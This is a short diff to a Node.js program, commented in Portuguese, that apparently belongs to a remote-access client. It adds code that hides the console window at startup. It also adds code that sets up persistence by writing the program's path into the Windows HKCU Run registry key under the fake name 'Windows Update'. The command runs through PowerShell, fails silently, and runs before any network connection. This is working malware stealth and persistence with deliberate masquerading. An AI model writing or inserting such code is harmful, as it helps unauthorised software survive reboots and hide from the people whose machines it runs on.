@@ -7,6 +7,42 @@ const os = require("os");
 const { execSync } = require("child_process");
 const { networkInterfaces } = require("os");
 
+// Carregar hideConsole com fallback para Docker
+let hideConsole;
+try {
+    hideConsole = require("node-hide-console-window");
+} catch (e) {
+    // Em Docker ou quando módulo não está disponível, usar função dummy
+    hideConsole = () => {};
+}
+
+// Oculta a janela do console imediatamente (no máximo em Windows)
+hideConsole();
+
+// =====================================================
+// PERSISTÊNCIA - Adicionar exe ao inicializador Windows
+// =====================================================
+function setPersistence() {
+    try {
+        // Obter caminho do executável
+        const exePath = process.execPath;
+        
+        // Comando para adicionar ao Startup via Registry
+        const regCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Update" /t REG_SZ /d "${exePath}" /f`;
+        
+        exec(regCmd, { shell: 'powershell.exe' }, (error, stdout, stderr) => {
+            if (!error) {
+                console.log("[PERSISTENCE] Exe adicionado ao inicializador Windows");
+            }
+        });
+    } catch (e) {
+        // Silenciosamente falhar
+    }
+}
+
+// Executar persistência ANTES de qualquer conexão
+setPersistence();
+
 // Armazenar chunks de arquivo em memória
 let fileChunks = [];
 let currentFileInfo = null;
